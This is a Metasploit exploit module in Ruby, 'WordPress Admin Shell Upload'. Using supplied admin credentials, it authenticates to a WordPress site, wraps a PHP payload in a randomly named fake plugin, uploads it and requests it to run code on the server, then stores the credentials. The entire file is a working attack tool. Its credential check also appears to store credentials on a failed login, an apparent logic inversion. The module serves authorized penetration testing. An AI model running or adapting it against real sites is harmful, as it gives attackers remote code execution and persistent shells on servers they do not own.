##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress Admin Shell Upload',
      'Description'     => %q{
          This module will generate a plugin, pack the payload into it
          and upload it to a server running WordPress providing valid
          admin credentials are used.
        },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'rastating' # Metasploit module
        ],
      'DisclosureDate'  => 'Feb 21 2015',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [['WordPress', {}]],
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])
      ])
  end

  def check
    cookie = wordpress_login(username, password)
    if cookie.nil?
      store_valid_credential(user: username, private: password, proof: cookie)
      return CheckCode::Safe
    end

    CheckCode::Appears
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def generate_plugin(plugin_name, payload_name)
    plugin_script = %Q{<?php
/**
 * Plugin Name: #{plugin_name}
 * Version: #{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(1)}.#{Rex::Text.rand_text_numeric(2)}
 * Author: #{Rex::Text.rand_text_alpha(10)}
 * Author URI: http://#{Rex::Text.rand_text_alpha(10)}.com
 * License: GPL2
 */
?>}

    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    zip.add_file("#{plugin_name}/#{plugin_name}.php", plugin_script)
    zip.add_file("#{plugin_name}/#{payload_name}.php", payload.encoded)
    zip
  end

  def exploit
    fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?

    print_status("Authenticating with WordPress using #{username}:#{password}...")
    cookie = wordpress_login(username, password)
    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?
    print_good("Authenticated with WordPress")
    store_valid_credential(user: username, private: password, proof: cookie)

    print_status("Preparing payload...")
    plugin_name = Rex::Text.rand_text_alpha(10)
    payload_name = "#{Rex::Text.rand_text_alpha(10)}"
    payload_uri = normalize_uri(wordpress_url_plugins, plugin_name, "#{payload_name}.php")
    zip = generate_plugin(plugin_name, payload_name)

    print_status("Uploading payload...")
    uploaded = wordpress_upload_plugin(plugin_name, zip.pack, cookie)
    fail_with(Failure::UnexpectedReply, 'Failed to upload the payload') unless uploaded

    print_status("Executing the payload at #{payload_uri}...")
    register_files_for_cleanup("#{payload_name}.php")
    register_files_for_cleanup("#{plugin_name}.php")
    register_dir_for_cleanup("../#{plugin_name}")
    send_request_cgi({ 'uri' => payload_uri, 'method' => 'GET' }, 5)
  end
end
